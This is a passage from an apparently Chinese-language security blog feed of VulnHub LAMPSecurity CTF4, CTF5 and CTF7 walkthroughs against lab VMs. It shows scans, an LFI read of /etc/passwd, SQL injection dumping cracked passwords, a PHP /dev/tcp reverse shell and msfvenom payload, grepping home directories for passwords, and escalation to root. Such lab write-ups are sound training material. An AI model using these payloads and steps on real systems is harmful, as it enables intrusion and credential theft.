current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| roundcube          |</span><br><span class="line">| website            |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use website;</span><br><span class="line">use website;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-------------------+</span><br><span class="line">| Tables_in_website |</span><br><span class="line">+-------------------+</span><br><span class="line">| contact           |</span><br><span class="line">| documents         |</span><br><span class="line">| hits              |</span><br><span class="line">| <span class="built_in">log</span>               |</span><br><span class="line">| newsletter        |</span><br><span class="line">| payment           |</span><br><span class="line">| trainings         |</span><br><span class="line">| trainings_x_users |</span><br><span class="line">| users             |</span><br><span class="line">+-------------------+</span><br><span class="line">9 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users</span><br><span class="line">select * from users</span><br><span class="line">    -&gt; ;</span><br><span class="line">;</span><br><span class="line">+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+</span><br><span class="line">| username                      | password                         | is_admin | last_login          | user_id | realname        | profile                                                                  |</span><br><span class="line">+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+</span><br><span class="line">| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 |        1 | 2012-12-19 11:30:54 |       3 | Brian Hershel   | Brian is our technical brains behind the operations and a chief trainer. |</span><br><span class="line">| john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 |        1 | NULL                |       4 | John Durham     |                                                                          |</span><br><span class="line">| alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 |        1 | NULL                |       5 | Alice Wonder    |                                                                          |</span><br><span class="line">| ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 |        1 | NULL                |       6 | Ruby Spinster   |                                                                          |</span><br><span class="line">| leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a |        1 | NULL                |       7 | Leon Parnetta   |                                                                          |</span><br><span class="line">| julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 |        1 | NULL                |       8 | Julia Fields    |                                                                          |</span><br><span class="line">| michael@localhost.localdomain | 9c42a1346e333a770904b2a2b37fa7d3 |        0 | NULL                |       9 | Michael Saint   |                                                                          |</span><br><span class="line">| bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e |        0 | NULL                |      10 | Bruce Pottricks |                                                                          |</span><br><span class="line">| neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 |        0 | NULL                |      11 | Neil Felstein   |                                                                          |</span><br><span class="line">| charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf |        0 | NULL                |      12 | Charles Adams   |                                                                          |</span><br><span class="line">| foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a |        0 | NULL                |      36 |                 |                                                                          |</span><br><span class="line">| <span class="built_in">test</span>@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |        0 | NULL                |     113 |                 |                                                                          |</span><br><span class="line">+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用一些脚本破解hash，或者在线的网站</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bash-4.1$ su brian</span><br><span class="line">su brian</span><br><span class="line">Password: my2cents</span><br><span class="line"></span><br><span class="line">[brian@localhost assets]$ id</span><br><span class="line">id</span><br><span class="line">uid=501(brian) gid=501(brian) groups=501(brian),10(wheel),500(webdev),512(admin) context=system_u:system_r:httpd_t:s0</span><br><span class="line">[brian@localhost assets]$ sudo su</span><br><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the <span class="built_in">local</span> System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> brian: my2cents</span><br><span class="line"></span><br><span class="line">[root@localhost assets]<span class="comment"># </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;download：&lt;code&gt;https://www.vulnhub.com/entry/lampsecurity-ctf7,86/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;找到ip为：&lt;code&gt;192.168.188.132&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; </summary>
      
    
    
    
    
    <category term="VulnHub" scheme="http://example.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub_02_LAMPSECURITY: CTF5</title>
    <link href="http://example.com/2022/02/17/VulnHub02/"/>
    <id>http://example.com/2022/02/17/VulnHub02/</id>
    <published>2022-02-16T16:00:00.000Z</published>
    <updated>2022-02-19T08:33:38.936Z</updated>
    
    <content type="html"><![CDATA[<p>download:<a href="https://www.vulnhub.com/entry/lampsecurity-ctf5,84/">https://www.vulnhub.com/entry/lampsecurity-ctf5,84/</a></p><p>扫描之后发现是：<code>http://192.168.188.131</code></p><p><code>nmap -sV &lt; 要扫描的目标ip地址&gt;</code>*</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># nmap -sV 192.168.188.131                                                                                   130 ⨯</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-16 01:26 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.188.131</span><br><span class="line">Host is up (0.0059s latency).</span><br><span class="line">Not shown: 990 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)</span><br><span class="line">25/tcp   open  smtp        Sendmail 8.14.1/8.14.1</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))</span><br><span class="line">110/tcp  open  pop3        ipop3d 2006k.101</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">143/tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0500)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">901/tcp  open  http        Samba SWAT administration server</span><br><span class="line">3306/tcp open  mysql       MySQL 5.0.45</span><br><span class="line">MAC Address: 00:0C:29:44:6B:32 (VMware)</span><br><span class="line">Service Info: Hosts: localhost.localdomain, 192.168.188.131; OS: Unix</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.79 seconds</span><br><span class="line">                                                                 </span><br></pre></td></tr></table></figure><p>使用nikto扫下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># nikto -h 192.168.188.131</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.188.131</span><br><span class="line">+ Target Hostname:    192.168.188.131</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2022-02-16 01:29:54 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.6 (Fedora)</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.2.4</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ Apache/2.2.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL <span class="keyword">for</span> the 2.x branch.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE </span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ /index.php: PHP include error may indicate <span class="built_in">local</span> or remote file inclusion is possible.</span><br><span class="line">^[[B^[[B^[[B+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is <span class="keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /phpmyadmin/ChangeLog, inode: 558008, size: 22676, mtime: Mon Aug 20 22:59:12 2029</span><br><span class="line">+ OSVDB-3092: /phpmyadmin/ChangeLog: phpMyAdmin is <span class="keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts.</span><br><span class="line">+ Cookie SQMSESSID created without the httponly flag</span><br><span class="line">+ OSVDB-3093: /mail/src/read_body.php: SquirrelMail found</span><br><span class="line">+ OSVDB-3093: /squirrelmail/src/read_body.php: SquirrelMail found</span><br><span class="line">+ /info.php: Output from the phpinfo() <span class="keyword">function</span> was found.</span><br><span class="line">+ OSVDB-3233: /info.php: PHP is installed, and a <span class="built_in">test</span> script <span class="built_in">which</span> runs phpinfo() was found. This gives a lot of system information.</span><br><span class="line">+ OSVDB-3268: /icons/: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake<span class="string">&#x27;s list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/</span></span><br><span class="line"><span class="string">+ /phpmyadmin/: phpMyAdmin directory found</span></span><br><span class="line"><span class="string">+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span></span><br><span class="line"><span class="string">+ OSVDB-3092: /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span></span><br><span class="line"><span class="string">+ 8724 requests: 0 error(s) and 26 item(s) reported on remote host</span></span><br><span class="line"><span class="string">+ End Time:           2022-02-16 01:30:19 (GMT-5) (25 seconds)</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">+ 1 host(s) tested</span></span><br></pre></td></tr></table></figure><p>可以看到有LFI/RFI</p><p><code>http://192.168.188.131//index.php?page=../../../../../../../../../etc/passwd%00</code></p><p><code>root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin nscd:x:28:28:NSCD Daemon:/:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin rpm:x:37:37:RPM user:/var/lib/rpm:/sbin/nologin polkituser:x:87:87:PolicyKit:/:/sbin/nologin avahi:x:499:499:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin openvpn:x:498:497:OpenVPN:/etc/openvpn:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin torrent:x:497:496:BitTorrent Seed/Tracker:/var/spool/bittorrent:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin gdm:x:42:42::/var/gdm:/sbin/nologin patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash andy:x:502:502:Andrew Carp:/home/andy:/bin/bash loren:x:503:503:Loren Felt:/home/loren:/bin/bash amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash </code></p><p>搜下底部关于nanocms的洞，：<a href="https://vulners.com/openvas/OPENVAS:100141">https://vulners.com/openvas/OPENVAS:100141</a></p><p>有个是密码散列信息泄露，允许不受限制地访问：/data/pagesdata.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:12:&#123;s:8:&quot;homepage&quot;;s:1:&quot;1&quot;;s:10:&quot;links_cats&quot;;a:4:&#123;s:7:&quot;sidebar&quot;;a:2:&#123;i:0;i:1;i:1;i:4;&#125;s:11:&quot;other-pages&quot;;a:0:&#123;&#125;s:14:&quot;top-navigation&quot;;a:2:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;4&quot;;&#125;s:12:&quot;Footer-Right&quot;;a:2:&#123;i:0;s:1:&quot;1&quot;;i:1;s:1:&quot;4&quot;;&#125;&#125;s:5:&quot;slugs&quot;;a:2:&#123;i:1;s:4:&quot;home&quot;;i:4;s:7:&quot;contact&quot;;&#125;s:6:&quot;titles&quot;;a:2:&#123;i:1;s:4:&quot;Home&quot;;i:4;s:7:&quot;Contact&quot;;&#125;s:10:&quot;slug_count&quot;;i:11;s:8:&quot;settings&quot;;a:3:&#123;s:19:&quot;index-last-modified&quot;;i:1234513760;s:18:&quot;def-template-areas&quot;;a:4:&#123;i:0;s:12:&quot;website name&quot;;i:2;s:14:&quot;website slogan&quot;;i:3;s:16:&quot;below navigation&quot;;i:4;s:16:&quot;copyright notice&quot;;&#125;s:18:&quot;def-template-links&quot;;a:2:&#123;i:0;s:14:&quot;top-navigation&quot;;i:1;s:12:&quot;Footer-Right&quot;;&#125;&#125;s:13:&quot;active-tweaks&quot;;a:2:&#123;i:0;s:7:&quot;deutsch&quot;;i:1;s:19:&quot;language-pack-tweak&quot;;&#125;s:11:&quot;lang-select&quot;;s:7:&quot;english&quot;;s:6:&quot;seourl&quot;;s:1:&quot;0&quot;;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;9d2f75377ac0ab991d40c91fd27e52fd&quot;;s:7:&quot;version&quot;;s:4:&quot;v_4f&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到admin的密码的hash解密为shannon</p><p>登进去后直接newpage，使用msfvenom反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.188.129 lport=4444 -f raw</span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/VulnHub02/image-20220216211315347.png" alt="image-20220216211315347"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> lhost 192.168.188.129</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">msf exploit(handler) &gt; run</span><br></pre></td></tr></table></figure><p>或者直接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;bash -i &gt;&amp; /dev/tcp/192.168.188.129/4444 0&gt;&amp;1&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">--------</span><br><span class="line">nc -lp 4444</span><br></pre></td></tr></table></figure><p>通过以下命令在home下找root密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -R -i password /home/* 2&gt; /dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/VulnHub02/image-20220216214354852.png" alt="image-20220216214354852"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bash-3.2$ su</span><br><span class="line">standard <span class="keyword">in</span> must be a tty</span><br><span class="line">bash-3.2$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">sh-3.2$ id</span><br><span class="line">id</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0</span><br><span class="line">sh-3.2$ su</span><br><span class="line">su</span><br><span class="line">Password: 50<span class="variable">$cent</span></span><br><span class="line"></span><br><span class="line">[root@localhost public_html]<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">[root@localhost public_html]<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>进去直接su的时候提示：<code>standard in must be a tty</code>，直接：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;download:&lt;a href=&quot;https://www.vulnhub.com/entry/lampsecurity-ctf5,84/&quot;&gt;https://www.vulnhub.com/entry/lampsecurity-ctf5,84/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;扫描之</summary>
      
    
    
    
    
    <category term="VulnHub" scheme="http://example.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub_01_LAMPSECURITY: CTF4</title>
    <link href="http://example.com/2022/02/16/VulnHub01/"/>
    <id>http://example.com/2022/02/16/VulnHub01/</id>
    <published>2022-02-15T16:00:00.000Z</published>
    <updated>2022-02-16T05:54:11.754Z</updated>
    
    <content type="html"><![CDATA[<p>开始打vulnhub</p><p>download：<code>https://www.vulnhub.com/entry/lampsecurity-ctf4,83/</code></p><p>扫描：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br><span class="line">nmap -sT -sV -O 192.168.188.0/24</span><br></pre></td></tr></table></figure><p>发现为<code>192.168.188.130</code></p><p>nmap扫下：</p><blockquote><p>  nmap -A :检测操作系统和服务</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.188.130                                                                                                                                                                                                            130 ⨯</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-16 00:23 EST</span><br><span class="line">Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 41.60% <span class="keyword">done</span>; ETC: 00:23 (0:00:04 remaining)</span><br><span class="line">Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 45.40% <span class="keyword">done</span>; ETC: 00:23 (0:00:04 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.188.130</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE  SERVICE VERSION</span><br><span class="line">22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)</span><br><span class="line">|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)</span><br><span class="line">25/tcp  open   smtp    Sendmail 8.13.5/8.13.5</span><br><span class="line">| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.188.129], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP, </span><br><span class="line">|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use <span class="string">&quot;HELP &lt;topic&gt;&quot;</span>. 2.0.0 To report bugs <span class="keyword">in</span> the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For <span class="built_in">local</span> information send email to Postmaster at your site. 2.0.0 End of HELP info </span><br><span class="line">80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))</span><br><span class="line">| http-robots.txt: 5 disallowed entries </span><br><span class="line">|_/mail/ /restricted/ /conf/ /sql/ /admin/</span><br><span class="line">|_http-server-header: Apache/2.2.0 (Fedora)</span><br><span class="line">|_http-title:  Prof. Ehks </span><br><span class="line">631/tcp closed ipp</span><br><span class="line">MAC Address: 00:0C:29:28:D9:61 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|proxy server|remote management|terminal server|switch|WAP</span><br><span class="line">Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (98%), SonicWALL embedded (95%), Control4 embedded (95%), Lantronix embedded (95%), SNR embedded (95%), Dell iDRAC 6 (94%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:sonicwall:aventail_ex-6000 cpe:/h:lantronix:slc_8 cpe:/h:snr:snr-s2960 cpe:/o:dell:idrac6_firmware cpe:/o:linux:linux_kernel:3.10 cpe:/o:linux:linux_kernel:4.1</span><br><span class="line">Aggressive OS guesses: Linux 2.6.16 - 2.6.21 (98%), Linux 2.6.13 - 2.6.32 (96%), SonicWALL Aventail EX-6000 VPN appliance (95%), Control4 HC-300 home controller (95%), Lantronix SLC 8 terminal server (Linux 2.6) (95%), SNR SNR-S2960 switch (95%), Linux 2.6.8 - 2.6.30 (94%), Linux 2.6.9 - 2.6.18 (94%), Dell iDRAC 6 remote access controller (Linux 2.6) (94%), Linux 2.6.18 - 2.6.32 (94%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: ctf4.sas.upenn.edu; OS: Unix</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.57 ms 192.168.188.130</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.98 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开了22,25,80.</p><p>访问blog，url有注入，sqlmap直接跑。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.188.130/index.html?page=blog&amp;title=Blog&amp;id=7%27&quot;</span> -D ehks -T user --dump</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| user_id | user_name | user_pass                                        |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br><span class="line">| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |</span><br><span class="line">| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |</span><br><span class="line">| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |</span><br><span class="line">| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |</span><br><span class="line">| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |</span><br><span class="line">| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |</span><br><span class="line">+---------+-----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure><p>ssh练了一次连不上，搜了下加个参数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o KexAlgorithms=diffie-hellman-group1-sha1 achen@192.168.188.130 </span><br></pre></td></tr></table></figure><p>进去之后<code>sudo 